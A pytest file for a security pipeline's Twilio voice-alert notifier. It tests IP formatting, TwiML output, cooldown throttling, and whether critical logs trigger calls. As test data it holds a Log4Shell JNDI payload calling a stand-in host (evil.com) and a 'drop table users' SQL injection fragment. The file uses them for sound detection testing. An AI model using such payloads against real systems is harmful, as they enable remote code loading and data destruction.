import pytest
from app.notifications.twilio_voice import TwilioVoiceNotifier, _format_ip_for_speech


def test_ip_speech_formatting():
    assert _format_ip_for_speech("192.168.1.100") == "192 dot 168 dot 1 dot 100"
    assert _format_ip_for_speech("10.0.0.1") == "10 dot 0 dot 0 dot 1"
    assert _format_ip_for_speech("") == "an unknown host"
    assert _format_ip_for_speech("0.0.0.0") == "an unknown host"


def test_twiml_generation():
    notifier = TwilioVoiceNotifier()
    twiml = notifier.build_twiml(
        threat_type="SQL Injection",
        src_ip="198.51.100.45",
        detail="UNION SELECT bypass attempt",
    )
    assert "<Response>" in twiml
    assert '<Say voice="alice" language="en-US">' in twiml
    assert "SQL Injection" in twiml
    assert "198 dot 51 dot 100 dot 45" in twiml
    assert "<Hangup/>" in twiml
    assert "</Response>" in twiml


def test_simulated_voice_call_dispatch(monkeypatch):
    notifier = TwilioVoiceNotifier()
    # Unconfigured credentials triggers simulation mode
    monkeypatch.setattr(notifier, "is_configured", lambda: False)
    result = notifier.send_voice_call(
        threat_type="Log4Shell (JNDI)",
        src_ip="203.0.113.19",
        detail="Injected ${jndi:ldap://evil.com/a}",
        to_number="+17372508034",
        force=True,
    )
    assert result["status"] == "simulated"
    assert result["to_number"] == "+17372508034"
    assert "Log4Shell" in result["threat_type"]
    assert len(notifier.call_history) > 0


def test_cooldown_throttling(monkeypatch):
    from app.auth.manager import auth_manager
    # Simulate no active operator on site to test pure telephony cooldown
    monkeypatch.setattr(auth_manager, "check_presence", lambda: (False, None))

    notifier = TwilioVoiceNotifier()
    # Mock external carrier HTTP call to avoid placing real telephone calls during unit tests
    monkeypatch.setattr(notifier, "_dispatch_carrier_call", lambda **kwargs: {
        "call_id": "MOCK-1",
        "timestamp": "2026-11-06T00:00:00Z",
        "to_number": kwargs.get("target_number"),
        "from_number": "+17372508034",
        "threat_type": kwargs.get("threat_type"),
        "src_ip": kwargs.get("src_ip"),
        "status": "initiated",
        "call_sid": "CA_MOCK_TEST",
        "message": "Carrier call mock initiated.",
    })

    # First call
    res1 = notifier.send_voice_call(
        threat_type="Command Injection",
        src_ip="10.0.0.99",
        force=False,
    )
    # Second immediate call should be throttled
    res2 = notifier.send_voice_call(
        threat_type="Command Injection",
        src_ip="10.0.0.99",
        force=False,
    )
    assert res2["status"] == "throttled"
    assert "cooldown guard" in res2["reason"]
    assert res2.get("remaining_cooldown_seconds", 0) > 0
    status = notifier.get_status()
    assert status["cooldown_active"] is True
    assert status["cooldown_remaining_seconds"] > 0


def test_status_reporting():
    notifier = TwilioVoiceNotifier()
    status = notifier.get_status()
    assert "enabled" in status
    assert "configured" in status
    assert status["target_number"] == notifier.target_number
    assert "recent_calls" in status


def test_non_critical_log_does_not_trigger_voice_call(monkeypatch):
    from app.auth.manager import auth_manager
    from app.notifications.twilio_voice import twilio_voice_notifier
    from app.api.routes import pipeline, store_and_broadcast, persistence_manager

    monkeypatch.setattr(auth_manager, "check_presence", lambda: (False, None))
    monkeypatch.setattr(persistence_manager, "persist_event", lambda **kwargs: kwargs.get("record", {}))

    initial_count = len(twilio_voice_notifier.call_history)

    # Standard benign web request log (even if severity tag is high or info)
    benign_log = "Nov  6 03:00:00 web-01 nginx: 10.0.0.5 - - [06/Nov/2026:03:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 612"
    ir = pipeline.process(benign_log, source="web-01")
    store_and_broadcast(ir, source_name="web-01")

    # Routine syslog with severity PRI (e.g., local0.crit without an attack payload)
    routine_syslog = "<130>Nov  6 03:00:01 edge-router BGP: Neighbor 192.168.1.1 reset peer connection"
    ir2 = pipeline.process(routine_syslog, source="edge-router")
    store_and_broadcast(ir2, source_name="edge-router")

    import time
    time.sleep(0.2)

    # History count should not increase because no critical security threat was detected
    assert len(twilio_voice_notifier.call_history) == initial_count


def test_pipeline_critical_log_triggers_voice_alert(monkeypatch):
    import time
    from app.auth.manager import auth_manager
    from app.notifications.twilio_voice import twilio_voice_notifier
    from app.api.routes import pipeline, store_and_broadcast, persistence_manager

    # Ensure no operator on site so call triggers
    monkeypatch.setattr(auth_manager, "check_presence", lambda: (False, None))
    # Avoid waiting for MinIO network timeout in unit test
    monkeypatch.setattr(persistence_manager, "persist_event", lambda **kwargs: kwargs.get("record", {}))
    # Mock external carrier HTTP call to avoid ringing real telephone
    monkeypatch.setattr(twilio_voice_notifier, "_dispatch_carrier_call", lambda **kwargs: {
        "call_id": "MOCK-CRIT-1",
        "timestamp": "2026-11-06T00:00:00Z",
        "to_number": kwargs.get("target_number"),
        "from_number": "+17372508034",
        "threat_type": kwargs.get("threat_type"),
        "src_ip": kwargs.get("src_ip"),
        "status": "initiated",
        "call_sid": "CA_MOCK_CRIT",
        "message": "Carrier call mock initiated.",
    })

    initial_count = len(twilio_voice_notifier.call_history)
    
    # Critical threat log (SQL Injection drop table)
    raw_critical = "Nov  6 03:00:00 waf-gateway nginx: src=198.51.100.55 event=attack POST /api/v1/query drop table users --"
    ir = pipeline.process(raw_critical, source="waf-gateway")
    record = store_and_broadcast(ir, source_name="waf-gateway")
    
    # Wait briefly for background thread to record call
    time.sleep(0.3)
    
    assert len(twilio_voice_notifier.call_history) >= initial_count + 1
    latest = twilio_voice_notifier.call_history[0]
    assert latest["to_number"] == twilio_voice_notifier.target_number
    assert latest["status"] in ("simulated", "initiated", "throttled", "suppressed_presence")

